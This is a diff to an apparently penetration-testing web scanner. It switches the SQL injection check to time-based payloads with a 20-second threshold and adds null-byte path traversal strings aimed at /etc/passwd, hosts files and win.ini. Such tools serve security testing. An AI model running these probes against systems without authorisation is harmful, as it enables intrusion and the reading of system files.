@@ -137,7 +137,7 @@ def sql_scan(scanurl,loginurl,userparam,passparam,csrfparam,username,password):
                 injects.append(data)
         temp = session.post(scanurl,params = post_data,verify=False)
         payurl = temp.url
-        filepath = './src/payload/sqli.txt'
+        filepath = './src/payload/sqltime.txt'
         print('current payload',post_data)
         with open(filepath) as fp:
             line = fp.readline()
@@ -153,7 +153,7 @@ def sql_scan(scanurl,loginurl,userparam,passparam,csrfparam,username,password):
                         print(post_data)
                         rs = session.post(payurl,params = post_data,verify=False)
                         print('total : ',rs.elapsed.total_seconds())
-                        if rs.elapsed.total_seconds() > 5:
+                        if rs.elapsed.total_seconds() > 20:
                             print('TING TING : SQL FOUND')
                             check = True
                             return True
@@ -168,7 +168,7 @@ def sql_scan(scanurl,loginurl,userparam,passparam,csrfparam,username,password):
                 get_data[data] = '1'
         temp = session.get(scanurl,params = get_data,verify=False)
         payurl = temp.url
-        filepath = './src/payload/sqli.txt'
+        filepath = './src/payload/sqltime.txt'
         print('current payload',get_data)
         with open(filepath) as fp:
             line = fp.readline()
@@ -180,7 +180,7 @@ def sql_scan(scanurl,loginurl,userparam,passparam,csrfparam,username,password):
                         print(get_data)
                         rs = session.get(payurl,params = get_data,verify=False)
                         print('total : ',rs.elapsed.total_seconds())
-                        if rs.elapsed.total_seconds() > 5:
+                        if rs.elapsed.total_seconds() > 20:
                             print('TING TING : SQL FOUND')
                             return True
                         else: 
@@ -198,14 +198,20 @@ def path_travel_scan(scanurl,loginurl,userparam,passparam,csrfparam,username,pas
     filepath = './src/payload/rfi.txt'
     linux_file_paths = [
         "/etc/passwd",
-        "/etc/hosts",
-        "/var/log/apache/access.log",
+        "/etc/hosts","/etc/passwd%00",
+        "/etc/hosts%00",
+        "/etc/passwd%00.jpg",
+        "/etc/hosts%00.jpg",
+        
     ]
 
     windows_file_paths = [
         "C:\\Windows\\win.ini",
         "C:\\Windows\\System32\\drivers\\etc\\hosts",
-        "C:\\xampp\\apache\\logs\\access.log",
+        "C:\\Windows\\win.ini%00",
+        "C:\\Windows\\System32\\drivers\\etc\\hosts%00",
+        "C:\\Windows\\win.ini%00.jpg",
+        "C:\\Windows\\System32\\drivers\\etc\\hosts%00.jpg",
     ]
     with open(filepath) as fp:
         line = fp.readline()
